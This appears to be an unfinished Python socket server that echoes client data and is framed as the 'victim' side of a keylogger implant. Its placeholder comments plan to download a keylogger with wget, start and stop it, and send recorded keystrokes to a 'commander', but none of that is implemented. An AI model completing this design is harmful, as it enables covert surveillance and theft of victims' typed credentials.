import socket

if __name__ == '__main__':
    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Define the server address and port
    server_address = ('localhost', 8888)

    # Bind the socket to the server address and port
    server_socket.bind(server_address)

    # Listen for incoming connections (maximum 5 clients in the queue)
    server_socket.listen(5)
    print("[+] Server is listening on IP {} on port{}".format(*server_address))

    while True:
        print("[+] Waiting for a connection...")
        client_socket, client_address = server_socket.accept()
        print("[+] Accepted connection from {}:{}".format(*client_address))

        try:
            while True:
                # Receive data from the client
                data = client_socket.recv(1024)
                if not data:
                    print("[+] Client {}:{} disconnected.".format(client_address[0], client_address[1]))
                    break

                print("[+] Received data: {}".format(data.decode('utf-8')))

                # Check if data is a signal to get keylogger program (wgets) -> Save to /victim/downloads/??

                # Check if data is to execute keylogger program

                # Check if data is to stop keylogger program

                # Check if data is to send recorded keystroked file to commander

                # Check if data is to terminate connection

                # Send the same data back to the client
                client_socket.send(data)
                print("[+] Sent data back to the client.")

        except ConnectionResetError:
            print("[+] The client {}:{} disconnected unexpectedly.".format(client_address[0], client_address[1]))
        except KeyboardInterrupt:
            print("[+] Victim is shutting down...")
            break
        except Exception as e:
            print("[+] An error occurred: {}".format(e))
